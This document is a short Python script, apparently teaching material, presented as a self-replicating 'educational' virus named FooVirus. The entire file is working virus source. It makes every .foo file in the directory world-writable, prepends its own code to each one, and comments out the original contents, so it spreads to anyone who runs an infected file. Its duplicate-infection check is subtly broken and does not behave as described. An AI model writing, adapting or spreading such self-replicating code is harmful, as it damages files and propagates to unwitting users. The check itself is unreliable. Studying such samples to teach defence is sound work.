#!/usr/bin/env python
import sys
import os
import glob

## FooVirus.py
## Author: Avi kak (kak@purdue.edu)
## Date: April 5, 2016

print("\nHELLO FROM FooVirus\n")

print("This is a demonstration of how easy it is to write")
print("a self-replicating program. This virus will infect")
print("all files whose names end in .foo in the directory")
print("in which you execute an infected file. If you send an")
print("infected file to someone else and they execute it,")
print("their .foo files will be damaged also.\n")
print("Note that this is a safe virus and it is for educational")
print("purposes only. The virus does not carry a harmful payload.")
print("All it does is to print out this message and comment out")
print("the code in .foo files.\n")

IN = open(sys.argv[0], 'r')
virus = [line for (i,line) in enumerate(IN) if i < 37]

for item in glob.glob("*.foo"):
	IN = open(item, 'r')
	all_of_it = IN.readlines()
	IN.close()
	if any(line.find('foovirus') for line in all_of_it):
		continue
	os.chmod(item, 0777)
	OUT = open(item, 'w')
	OUT.writelines(virus)
	all_of_it = ['#' + line for line in all_of_it]
	OUT.writelines(all_of_it)
	OUT.close()